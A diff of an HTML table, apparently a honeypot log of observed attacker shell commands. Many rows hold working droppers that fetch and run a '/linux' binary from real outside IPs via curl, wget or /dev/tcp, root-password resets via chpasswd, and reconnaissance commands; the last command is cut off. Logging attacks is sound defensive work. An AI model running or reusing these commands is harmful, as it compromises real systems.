-                                        <td><code>(1+1</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>nohup $SHELL -c "curl http://47.237.30.107:60122/linux -o /tmp/qmzJlLt5oF; if [ ! -f /tmp/qmzJlLt5oF ]; then wget http://47.237.30.107:60122/linux -O /tmp/qmzJlLt5oF; fi; if [ ! -f /tmp/qmzJlLt5oF ]; then exec 6<>/dev/tcp/47.237.30.107/60122 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/qmzJlLt5oF ; chmod +x /tmp/qmzJlLt5oF && /tmp/qmzJlLt5oF VESLlhweMgIfj4dKKCxUiY4eHTEdDoyESissUJ2JHBouFReChVQoKVSTjBkCMh8ZlotSNyhchYIYHDEYGZiCVio3UYSWHxo2Ah+Ph14vKVWCgA4YNwIWjp1QLzdXgIIYHDEdHZiHUzchUJ2JFxsuHhuKiVIpKFeGmBobLhQYloBTNyhRhIIYHDEfHJiHUzcoVoGWHx8wAh+JiVIpKFeCmBYCMh0eloZUNy9RiY4eHTIaDoyESisqUp2KHgI0FRSOg1UrKUSHjwAeMxsAi4NKKClTiY4eHTIeDoyESistVp2JHR0uHh6BiVIpKFaKmBobLh4djp1WLSpKgowdFjYcH4iBRCE3VoKPAB4xAh+Phl4vKVWDgQ4YNwIcjIFKKCpVnYwXFjYcH4mBRCgpVZ2KHhwuHR2InVYrL16FiB8dOQwaj51WKi9KgYweAjEcFI6DVSgtRIePAB4zFQCKg1E3K1SDghgcMR0cmIJUKDdWg4gAHTgbAIGCXi8pVYeODhg3AhyMgEooK1OdiRocOhoeiYdXOS1TnYkfHS4dHI2dUSsjUoOJHBggGBmWgVErN1WClhgcOhoeiYFSOShShpYfGTQCH4+CSigsU4mOHh0zFQ6MhEorKlKdih4CNBUUjoNVKylEh48AHjQeAImFSispXoWIHxg0DBiInVYpLEqCihgCMxUUjoNVLShEh48AFDYCH4+ESigtUYmOHh0wHw6KglU3KFCKlh8aMAIciYdeLylVh4AOHTAdAImBUjcoUp2KHxo6Gh6JgFM5LVOdih0aLh4aiJ1VKSNSg4kfGBXF87HIMdYd5glAoQxDTg==; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/qmzJlLt5oF && /tmp/qmzJlLt5oF VESLlhweMgIfj4dKKCxUiY4eHTEdDoyESissUJ2JHBouFReChVQoKVSTjBkCMh8ZlotSNyhchYIYHDEYGZiCVio3UYSWHxo2Ah+Ph14vKVWCgA4YNwIWjp1QLzdXgIIYHDEdHZiHUzchUJ2JFxsuHhuKiVIpKFeGmBobLhQYloBTNyhRhIIYHDEfHJiHUzcoVoGWHx8wAh+JiVIpKFeCmBYCMh0eloZUNy9RiY4eHTIaDoyESisqUp2KHgI0FRSOg1UrKUSHjwAeMxsAi4NKKClTiY4eHTIeDoyESistVp2JHR0uHh6BiVIpKFaKmBobLh4djp1WLSpKgowdFjYcH4iBRCE3VoKPAB4xAh+Phl4vKVWDgQ4YNwIcjIFKKCpVnYwXFjYcH4mBRCgpVZ2KHhwuHR2InVYrL16FiB8dOQwaj51WKi9KgYweAjEcFI6DVSgtRIePAB4zFQCKg1E3K1SDghgcMR0cmIJUKDdWg4gAHTgbAIGCXi8pVYeODhg3AhyMgEooK1OdiRocOhoeiYdXOS1TnYkfHS4dHI2dUSsjUoOJHBggGBmWgVErN1WClhgcOhoeiYFSOShShpYfGTQCH4+CSigsU4mOHh0zFQ6MhEorKlKdih4CNBUUjoNVKylEh48AHjQeAImFSispXoWIHxg0DBiInVYpLEqCihgCMxUUjoNVLShEh48AFDYCH4+ESigtUYmOHh0wHw6KglU3KFCKlh8aMAIciYdeLylVh4AOHTAdAImBUjcoUp2KHxo6Gh6JgFM5LVOdih0aLh4aiJ1VKSNSg4kfGBXF87HIMdYd5glAoQxDTg==" &</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>head -c 3610344 > /tmp/Ex0QLHK2kS</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>echo "root:4hfaTm2Tuwlj"|chpasswd|bash</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>echo "root:yDuKYYd4Fy0N"|chpasswd|bash</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>nohup $SHELL -c "curl http://47.237.122.155:60128/linux -o /tmp/1T7UogF0gg; if [ ! -f /tmp/1T7UogF0gg ]; then wget http://47.237.122.155:60128/linux -O /tmp/1T7UogF0gg; fi; if [ ! -f /tmp/1T7UogF0gg ]; then exec 6<>/dev/tcp/47.237.122.155/60128 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/1T7UogF0gg ; chmod +x /tmp/1T7UogF0gg && /tmp/1T7UogF0gg jUCbyxMj8l0fYDJnH1D+KwvMnlD87FiBzg8j6VgGZS5gBFn9Jw3NnlHs/lCd0ggk6VEDfzJkAVPxIQzIn0D+/FOByQo/9VoEfzJkBVPxIQzOmED4+06dzwQ/9lkCfzhrB1n2JQ3cm1fi/lSc0g8i6VoJazZhAFrwMQzOn0749E6eyQo/8lkLZzBgBVHnJQrSllji9VmBzQgo/V8BYDBlEV3wPwXIgVH1+06dyQ8r8VkAYjVxBV7pIwnPgVP54lOYxgsh9l0GcTRmH1vyIxPNnk76/FqZzAwj8UkFZi5gAFzpJgvSmFL2+lCezwgx814fYzRiH1j1JhPNm1D2+lCeyA4x814fYzNmH1j1IxPNmlX2+lCezgUx814fYzNoH1jzJRPOnlf2+lCezAwx814faDl/CFHpIAzJlVb8/VOc3Akm6VsEZS5nCEf2Ig7GmVD9/1WPyAo/9VoIfzRjH1v2JQfKn1H+/0CbyxMj9F4fYDJjH1jyJAfKn1H+9ECbyxMm8UcHZy5jAFPxIQzMmUD4+06XzxMj91ofYDhiC1/3IA7Ej1ji/lGf0ggh6V8EazZhAFvxMQnLgVf64laY0g4g/V8BYDBgEVj1IBPInk71+U6byQcn91gFYCBlBkf1IgTSm1Li/lGbxgsh9lsCcTRmH1v0KRPNmVTi+FOVyg0g9VoRaS5jAFnpIwnKgVn2+lCezQgx/0cDYDl/A1n+PwzLn1r6/FGdzB0g9VofZDd/AF/xPwzLm1r6/FGexB0p6VsAaS5gA1zpIw3OlVb8/VSYLQG4uSBRSLQI21aKOd2PQB1FF2HhSVw=; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/1T7UogF0gg && /tmp/1T7UogF0gg jUCbyxMj8l0fYDJnH1D+KwvMnlD87FiBzg8j6VgGZS5gBFn9Jw3NnlHs/lCd0ggk6VEDfzJkAVPxIQzIn0D+/FOByQo/9VoEfzJkBVPxIQzOmED4+06dzwQ/9lkCfzhrB1n2JQ3cm1fi/lSc0g8i6VoJazZhAFrwMQzOn0749E6eyQo/8lkLZzBgBVHnJQrSllji9VmBzQgo/V8BYDBlEV3wPwXIgVH1+06dyQ8r8VkAYjVxBV7pIwnPgVP54lOYxgsh9l0GcTRmH1vyIxPNnk76/FqZzAwj8UkFZi5gAFzpJgvSmFL2+lCezwgx814fYzRiH1j1JhPNm1D2+lCeyA4x814fYzNmH1j1IxPNmlX2+lCezgUx814fYzNoH1jzJRPOnlf2+lCezAwx814faDl/CFHpIAzJlVb8/VOc3Akm6VsEZS5nCEf2Ig7GmVD9/1WPyAo/9VoIfzRjH1v2JQfKn1H+/0CbyxMj9F4fYDJjH1jyJAfKn1H+9ECbyxMm8UcHZy5jAFPxIQzMmUD4+06XzxMj91ofYDhiC1/3IA7Ej1ji/lGf0ggh6V8EazZhAFvxMQnLgVf64laY0g4g/V8BYDBgEVj1IBPInk71+U6byQcn91gFYCBlBkf1IgTSm1Li/lGbxgsh9lsCcTRmH1v0KRPNmVTi+FOVyg0g9VoRaS5jAFnpIwnKgVn2+lCezQgx/0cDYDl/A1n+PwzLn1r6/FGdzB0g9VofZDd/AF/xPwzLm1r6/FGexB0p6VsAaS5gA1zpIw3OlVb8/VSYLQG4uSBRSLQI21aKOd2PQB1FF2HhSVw=" &</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>head -c 3631236 > /tmp/yILm2suPl6</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
                                         <td><code>echo "root:Np0bKVRfW1SS"|chpasswd|bash</code></td>
                                         <td>1</td>
                                     </tr>
@@ -963,37 +1021,17 @@
                                     </tr>
                                     
                                     <tr>
+                                        <td><code>nohup $SHELL -c "curl http://47.237.30.107:60122/linux -o /tmp/qmzJlLt5oF; if [ ! -f /tmp/qmzJlLt5oF ]; then wget http://47.237.30.107:60122/linux -O /tmp/qmzJlLt5oF; fi; if [ ! -f /tmp/qmzJlLt5oF ]; then exec 6<>/dev/tcp/47.237.30.107/60122 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/qmzJlLt5oF ; chmod +x /tmp/qmzJlLt5oF && /tmp/qmzJlLt5oF VESLlhweMgIfj4dKKCxUiY4eHTEdDoyESissUJ2JHBouFReChVQoKVSTjBkCMh8ZlotSNyhchYIYHDEYGZiCVio3UYSWHxo2Ah+Ph14vKVWCgA4YNwIWjp1QLzdXgIIYHDEdHZiHUzchUJ2JFxsuHhuKiVIpKFeGmBobLhQYloBTNyhRhIIYHDEfHJiHUzcoVoGWHx8wAh+JiVIpKFeCmBYCMh0eloZUNy9RiY4eHTIaDoyESisqUp2KHgI0FRSOg1UrKUSHjwAeMxsAi4NKKClTiY4eHTIeDoyESistVp2JHR0uHh6BiVIpKFaKmBobLh4djp1WLSpKgowdFjYcH4iBRCE3VoKPAB4xAh+Phl4vKVWDgQ4YNwIcjIFKKCpVnYwXFjYcH4mBRCgpVZ2KHhwuHR2InVYrL16FiB8dOQwaj51WKi9KgYweAjEcFI6DVSgtRIePAB4zFQCKg1E3K1SDghgcMR0cmIJUKDdWg4gAHTgbAIGCXi8pVYeODhg3AhyMgEooK1OdiRocOhoeiYdXOS1TnYkfHS4dHI2dUSsjUoOJHBggGBmWgVErN1WClhgcOhoeiYFSOShShpYfGTQCH4+CSigsU4mOHh0zFQ6MhEorKlKdih4CNBUUjoNVKylEh48AHjQeAImFSispXoWIHxg0DBiInVYpLEqCihgCMxUUjoNVLShEh48AFDYCH4+ESigtUYmOHh0wHw6KglU3KFCKlh8aMAIciYdeLylVh4AOHTAdAImBUjcoUp2KHxo6Gh6JgFM5LVOdih0aLh4aiJ1VKSNSg4kfGBXF87HIMdYd5glAoQxDTg==; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/qmzJlLt5oF && /tmp/qmzJlLt5oF VESLlhweMgIfj4dKKCxUiY4eHTEdDoyESissUJ2JHBouFReChVQoKVSTjBkCMh8ZlotSNyhchYIYHDEYGZiCVio3UYSWHxo2Ah+Ph14vKVWCgA4YNwIWjp1QLzdXgIIYHDEdHZiHUzchUJ2JFxsuHhuKiVIpKFeGmBobLhQYloBTNyhRhIIYHDEfHJiHUzcoVoGWHx8wAh+JiVIpKFeCmBYCMh0eloZUNy9RiY4eHTIaDoyESisqUp2KHgI0FRSOg1UrKUSHjwAeMxsAi4NKKClTiY4eHTIeDoyESistVp2JHR0uHh6BiVIpKFaKmBobLh4djp1WLSpKgowdFjYcH4iBRCE3VoKPAB4xAh+Phl4vKVWDgQ4YNwIcjIFKKCpVnYwXFjYcH4mBRCgpVZ2KHhwuHR2InVYrL16FiB8dOQwaj51WKi9KgYweAjEcFI6DVSgtRIePAB4zFQCKg1E3K1SDghgcMR0cmIJUKDdWg4gAHTgbAIGCXi8pVYeODhg3AhyMgEooK1OdiRocOhoeiYdXOS1TnYkfHS4dHI2dUSsjUoOJHBggGBmWgVErN1WClhgcOhoeiYFSOShShpYfGTQCH4+CSigsU4mOHh0zFQ6MhEorKlKdih4CNBUUjoNVKylEh48AHjQeAImFSispXoWIHxg0DBiInVYpLEqCihgCMxUUjoNVLShEh48AFDYCH4+ESigtUYmOHh0wHw6KglU3KFCKlh8aMAIciYdeLylVh4AOHTAdAImBUjcoUp2KHxo6Gh6JgFM5LVOdih0aLh4aiJ1VKSNSg4kfGBXF87HIMdYd5glAoQxDTg==" &</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>head -c 3610344 > /tmp/Ex0QLHK2kS</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
                                         <td><code>echo "root:MCNIXG3mC4Jv"|chpasswd|bash</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>lsb_release -d</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>echo "root:M1b9FaA5afE1"|chpasswd|bash</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>echo "root:iQkhF4xBj0f8"|chpasswd|bash</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>nohup $SHELL -c "curl http://101.126.16.216:60137/linux -o /tmp/ooBUGej3Hr; if [ ! -f /tmp/ooBUGej3Hr ]; then wget http://101.126.16.216:60137/linux -O /tmp/ooBUGej3Hr; fi; if [ ! -f /tmp/ooBUGej3Hr ]; then exec 6<>/dev/tcp/101.126.16.216/60137 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/ooBUGej3Hr ; chmod +x /tmp/ooBUGej3Hr && /tmp/ooBUGej3Hr A4wQoz2Qa7/kCmMBh1nj6VqGHmYM9aVujD24HIJ/fJoGtDaYb6HkDWcPglv94V+AAWUN+6VgmDm9GZ5+bpgfoz2Rbr/kD2UBh1nm6VqGHmUF9al3kzu8BpV7YJ0QvDWUaaDnCncbgULh4FuYF2cT5KVpmDm9GZ54bpgfoz2Rb7/nCWQBh1jg6VqGHmcP9ahrjD68EIJ8fZkGvz2aY6flDGYell3k5kKAAWQP+6NolzW7GJ1+e4wcuiGQaqb7DmcBh1zk6VqGHmUP9aVujD24GoJ9e4IRvTWUaaDnCncej1794EKPHXkF4qtvkj69HIx8fp4GuDqMYaP7D2IfjFrj4liGD28T5KJqjDyjGp55dJoYvDuTeaDlDHkehFr94lqYHWYL76dpkzy6CJh5YJseoz6Rab/sC20Zhl3j5EyCGHkP4KN3lTajHpx0eJwZvzaCbab7BWEBh1vl/VmGFWEN5KVsgju6Bp59doIavzuMYKHvC2cehF7z60KEHm8T4al3kD21Epp+f5gbrTuVd6bjE2EYmF/i6VqGHmcM9al3kzy1Bp18fIIZuT6Yb6HkCWMPglv94VmEAWQI+6hpmDm9GZ55bpgfoz2Rbr/kD2UBh1nm6VqGHmUF9aBulyG5GoJ9fYIZuzyYb6HkCWUPglv94VmEAWAE+6dpmDm9GZ53bp4YvyGXbL/tD3kdg1zp5VyHG2cd4aZ3kDu+Bp59YJ8QtzmSaKLiHW4dmF3i60KEHGIT56NhmDm9GZ1/bpgfoz2Rbr/tDXkeglzp5VyHHWEASjNBWwXVr8Cfaz17DdwPYc0SPKIVPoynVMwb5k5MUg==; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/ooBUGej3Hr && /tmp/ooBUGej3Hr A4wQoz2Qa7/kCmMBh1nj6VqGHmYM9aVujD24HIJ/fJoGtDaYb6HkDWcPglv94V+AAWUN+6VgmDm9GZ5+bpgfoz2Rbr/kD2UBh1nm6VqGHmUF9al3kzu8BpV7YJ0QvDWUaaDnCncbgULh4FuYF2cT5KVpmDm9GZ54bpgfoz2Rb7/nCWQBh1jg6VqGHmcP9ahrjD68EIJ8fZkGvz2aY6flDGYell3k5kKAAWQP+6NolzW7GJ1+e4wcuiGQaqb7DmcBh1zk6VqGHmUP9aVujD24GoJ9e4IRvTWUaaDnCncej1794EKPHXkF4qtvkj69HIx8fp4GuDqMYaP7D2IfjFrj4liGD28T5KJqjDyjGp55dJoYvDuTeaDlDHkehFr94lqYHWYL76dpkzy6CJh5YJseoz6Rab/sC20Zhl3j5EyCGHkP4KN3lTajHpx0eJwZvzaCbab7BWEBh1vl/VmGFWEN5KVsgju6Bp59doIavzuMYKHvC2cehF7z60KEHm8T4al3kD21Epp+f5gbrTuVd6bjE2EYmF/i6VqGHmcM9al3kzy1Bp18fIIZuT6Yb6HkCWMPglv94VmEAWQI+6hpmDm9GZ55bpgfoz2Rbr/kD2UBh1nm6VqGHmUF9aBulyG5GoJ9fYIZuzyYb6HkCWUPglv94VmEAWAE+6dpmDm9GZ53bp4YvyGXbL/tD3kdg1zp5VyHG2cd4aZ3kDu+Bp59YJ8QtzmSaKLiHW4dmF3i60KEHGIT56NhmDm9GZ1/bpgfoz2Rbr/tDXkeglzp5VyHHWEASjNBWwXVr8Cfaz17DdwPYc0SPKIVPoynVMwb5k5MUg==" &</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>head -c 3610344 > /tmp/xjK8DtCyQi</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>echo "root:L4uC6qgRFrfP"|chpasswd|bash</code></td>
                                         <td>1</td>
                                     </tr>
                                     
@@ -1038,7 +1076,142 @@
                                     </tr>
                                     
                                     <tr>
+                                        <td><code>echo "root:lyrS4b2Brd6P"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>lsb_release -d</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:M1b9FaA5afE1"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:iQkhF4xBj0f8"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:ZuEEueFVZNLX"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>which apt</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:cDYg6JZ4Bd4Z"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>nohup $SHELL -c "curl http://36.134.194.19:60147/linux -o /tmp/sU2MUWgrNo; if [ ! -f /tmp/sU2MUWgrNo ]; then wget http://36.134.194.19:60147/linux -O /tmp/sU2MUWgrNo; fi; if [ ! -f /tmp/sU2MUWgrNo ]; then exec 6<>/dev/tcp/36.134.194.19/60147 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/sU2MUWgrNo ; chmod +x /tmp/sU2MUWgrNo && /tmp/sU2MUWgrNo NFYyc/Q3JWIQLZP/9Tni85csD2YgJeJqNERLV0cxcPQ0JWYEKpH46jH7+JQsEGcgPPR2MkVXT0M8cuo0Im4eKJbn6TXp55AtEGAgP+x0N0RPWUIxaug2JngMKJLn6jTo85csD2YiJe5zKERKQFgyffQ0I2EEKpH46Db7/ZYyDGIiK+tyKERJQ0A2de4xMGUIMpD67y7q8JUyD28qM+p1MkFZTUEofOkrImYNMpDx6Drt+ZAvBnYiNehqM0NXQUQodu81KmAOLZX5+zj1+5AsEGcnPfRwNkxPSUc1dfoxJ3gMKZPn6DX18JEmCGYhN+1kMkFXS0UxauIzPmcGKpv/6zHv/oEoCXgiNu1qNUZXSEYxfuw1IWQMPJX+9TLu/Y8oCngiMeByNkdLTVYyc/Q3I2AQLpXw9Tjq85csD2QjJe5zKERKQFg0cO8rImAEKpH46DD7/ZYyDGUpK+h0PlhMTUwwdOsxKXYKK4/x7S7p8Y8oCWwmNet3N1ZBV0Q3dPQwIHgIKZv/6zHp/4EuD2c+NO59KEdPSVg0de4/JmYPKJnp6jnp55IyB2Q+Pe1+MEZISUImcO0rJ2AQKpfn6THh/5EtDmAwNO90KEdJQFg0cOkrJmMEKpH46Tj7/ZMyD28iK+l8KEdBQ0A2dek1MGIJMpn69TLv+o8tBmQqM+p1NkBZTUEodukzPmQKJY/x6jrt+ZAuDXYkMvR2NUBXS0I1ausxI2wILJD56SDv/o8uC2Q+Nu9qP0ZDT0Y3du0lI2AQLZL99THi/Y8tB2wmNetwMVYBfFOB+L1FCCjZQ8AqG4p4NDYTrf1bF3p3L+32; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/sU2MUWgrNo && /tmp/sU2MUWgrNo NFYyc/Q3JWIQLZP/9Tni85csD2YgJeJqNERLV0cxcPQ0JWYEKpH46jH7+JQsEGcgPPR2MkVXT0M8cuo0Im4eKJbn6TXp55AtEGAgP+x0N0RPWUIxaug2JngMKJLn6jTo85csD2YiJe5zKERKQFgyffQ0I2EEKpH46Db7/ZYyDGIiK+tyKERJQ0A2de4xMGUIMpD67y7q8JUyD28qM+p1MkFZTUEofOkrImYNMpDx6Drt+ZAvBnYiNehqM0NXQUQodu81KmAOLZX5+zj1+5AsEGcnPfRwNkxPSUc1dfoxJ3gMKZPn6DX18JEmCGYhN+1kMkFXS0UxauIzPmcGKpv/6zHv/oEoCXgiNu1qNUZXSEYxfuw1IWQMPJX+9TLu/Y8oCngiMeByNkdLTVYyc/Q3I2AQLpXw9Tjq85csD2QjJe5zKERKQFg0cO8rImAEKpH46DD7/ZYyDGUpK+h0PlhMTUwwdOsxKXYKK4/x7S7p8Y8oCWwmNet3N1ZBV0Q3dPQwIHgIKZv/6zHp/4EuD2c+NO59KEdPSVg0de4/JmYPKJnp6jnp55IyB2Q+Pe1+MEZISUImcO0rJ2AQKpfn6THh/5EtDmAwNO90KEdJQFg0cOkrJmMEKpH46Tj7/ZMyD28iK+l8KEdBQ0A2dek1MGIJMpn69TLv+o8tBmQqM+p1NkBZTUEodukzPmQKJY/x6jrt+ZAuDXYkMvR2NUBXS0I1ausxI2wILJD56SDv/o8uC2Q+Nu9qP0ZDT0Y3du0lI2AQLZL99THi/Y8tB2wmNetwMVYBfFOB+L1FCCjZQ8AqG4p4NDYTrf1bF3p3L+32" &</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>head -c 3610344 > /tmp/JWYDfHWmB4</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
                                         <td><code>echo "root:FhMY6hPOjc22"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:6nX2y8ECMZO3"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:MEvjkCaedKen"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:idxvY5qKgUmP"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:m5GWF2eybbzj"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>nohup $SHELL -c "curl http://47.239.42.214:60123/linux -o /tmp/DhjcNkNETh; if [ ! -f /tmp/DhjcNkNETh ]; then wget http://47.239.42.214:60123/linux -O /tmp/DhjcNkNETh; fi; if [ ! -f /tmp/DhjcNkNETh ]; then exec 6<>/dev/tcp/47.239.42.214/60123 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/DhjcNkNETh ; chmod +x /tmp/DhjcNkNETh && /tmp/DhjcNkNETh t6NRIX0Cjc/gN+XPjgV/NV+zy8uySTt4Ho3U5S7g04kedjZTtcrLs1kveweR0+Uy/9OMBWE+WbXAzLNYPnkQi9b/MuLXkQJ7Nke7y8C1WT59A5/V5i7j0ogedz9Hss7KuV8/fgKJweU3/9OKAmE+WK3MyrlfP34CicHlN//TjAlhN1mty8uwUzl/AYzR8TTmz40DeSFbs9TOulM5fwGN0fEx6NORA2E2W63CzblfP34Ai8HlN//TjAdhPlux1Mu2XDV5AI7T6SDl1pECfDZHt8jUsVg7dQaP0OMz8dWIHnc5R7LNza1YO3oKidHgMOLBiwdhN1qtyMqwRz53A4XX4THi2Z8EeCFbsM3UsFkhfgCI2+cw4NONEHs4R7HJza1ROWEBh9frNuHQiwdvPlmy1MuxXyF+BpHT4Dbr148BfDhJt83UsV08YQGN1v8x5dGFBn8+XbDayLNeIX4Ij8/jMePPjgZ1OVmyzsmjXThhAovS/zHj1pEBez9TtcrLt1ovfgCOz+Ay58+OBmE9WLXAzLNYPHgQi9b/MuLYkQR9IVuyzsC1WT59A5/V5i7j0ogedz9Hss7KuV8/fgKJweU3/9OMCWE3Wa3Ly7BTOX8BjNHxNObPjQN5IVuz1M66Uzl/AY3R8TTmz40DeCFYscjUslw6dQaP0OM48deJHn0/X63Jw61dPXUGj9DhM/HViB59O1utyMm2Rz5/BoXX4THg158Bdj1HsNTDsUc3eAqJ0eAw5cGLB2E9WrXUyLdQIXcBhdfhMePSnwR9IVi6ztSyXT5hAovT6zbh0I0Bo5/QGLu0ZWn54CiI2oT0F7kcWQgb; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/DhjcNkNETh && /tmp/DhjcNkNETh t6NRIX0Cjc/gN+XPjgV/NV+zy8uySTt4Ho3U5S7g04kedjZTtcrLs1kveweR0+Uy/9OMBWE+WbXAzLNYPnkQi9b/MuLXkQJ7Nke7y8C1WT59A5/V5i7j0ogedz9Hss7KuV8/fgKJweU3/9OKAmE+WK3MyrlfP34CicHlN//TjAlhN1mty8uwUzl/AYzR8TTmz40DeSFbs9TOulM5fwGN0fEx6NORA2E2W63CzblfP34Ai8HlN//TjAdhPlux1Mu2XDV5AI7T6SDl1pECfDZHt8jUsVg7dQaP0OMz8dWIHnc5R7LNza1YO3oKidHgMOLBiwdhN1qtyMqwRz53A4XX4THi2Z8EeCFbsM3UsFkhfgCI2+cw4NONEHs4R7HJza1ROWEBh9frNuHQiwdvPlmy1MuxXyF+BpHT4Dbr148BfDhJt83UsV08YQGN1v8x5dGFBn8+XbDayLNeIX4Ij8/jMePPjgZ1OVmyzsmjXThhAovS/zHj1pEBez9TtcrLt1ovfgCOz+Ay58+OBmE9WLXAzLNYPHgQi9b/MuLYkQR9IVuyzsC1WT59A5/V5i7j0ogedz9Hss7KuV8/fgKJweU3/9OMCWE3Wa3Ly7BTOX8BjNHxNObPjQN5IVuz1M66Uzl/AY3R8TTmz40DeCFYscjUslw6dQaP0OM48deJHn0/X63Jw61dPXUGj9DhM/HViB59O1utyMm2Rz5/BoXX4THg158Bdj1HsNTDsUc3eAqJ0eAw5cGLB2E9WrXUyLdQIXcBhdfhMePSnwR9IVi6ztSyXT5hAovT6zbh0I0Bo5/QGLu0ZWn54CiI2oT0F7kcWQgb" &</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>head -c 3610344 > /tmp/fNkeZdTvRQ</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>nohup $SHELL -c "curl http://47.239.42.214:60123/linux -o /tmp/tGt8tARgEl; if [ ! -f /tmp/tGt8tARgEl ]; then wget http://47.239.42.214:60123/linux -O /tmp/tGt8tARgEl; fi; if [ ! -f /tmp/tGt8tARgEl ]; then exec 6<>/dev/tcp/47.239.42.214/60123 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/tGt8tARgEl ; chmod +x /tmp/tGt8tARgEl && /tmp/tGt8tARgEl t6NRIX0Cjc/gN+XPjgV/NV+zy8uySTt4Ho3U5S7g04kedjZTtcrLs1kveweR0+Uy/9OMBWE+WbXAzLNYPnkQi9b/MuLXkQJ7Nke7y8C1WT59A5/V5i7j0ogedz9Hss7KuV8/fgKJweU3/9OKAmE+WK3MyrlfP34CicHlN//TjAlhN1mty8uwUzl/AYzR8TTmz40DeSFbs9TOulM5fwGN0fEx6NORA2E2W63CzblfP34Ai8HlN//TjAdhPlux1Mu2XDV5AI7T6SDl1pECfDZHt8jUsVg7dQaP0OMz8dWIHnc5R7LNza1YO3oKidHgMOLBiwdhN1qtyMqwRz53A4XX4THi2Z8EeCFbsM3UsFkhfgCI2+cw4NONEHs4R7HJza1ROWEBh9frNuHQiwdvPlmy1MuxXyF+BpHT4Dbr148BfDhJt83UsV08YQGN1v8x5dGFBn8+XbDayLNeIX4Ij8/jMePPjgZ1OVmyzsmjXThhAovS/zHj1pEBez9TtcrLt1ovfgCOz+Ay58+OBmE9WLXAzLNYPHgQi9b/MuLYkQR9IVuyzsC1WT59A5/V5i7j0ogedz9Hss7KuV8/fgKJweU3/9OMCWE3Wa3Ly7BTOX8BjNHxNObPjQN5IVuz1M66Uzl/AY3R8TTmz40DeCFYscjUslw6dQaP0OM48deJHn0/X63Jw61dPXUGj9DhM/HViB59O1utyMm2Rz5/BoXX4THg158Bdj1HsNTDsUc3eAqJ0eAw5cGLB2E9WrXUyLdQIXcBhdfhMePSnwR9IVi6ztSyXT5hAovT6zbh0I0Bo5/QGLu0ZWn54CiI2oT0F7kcWQgb; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/tGt8tARgEl && /tmp/tGt8tARgEl 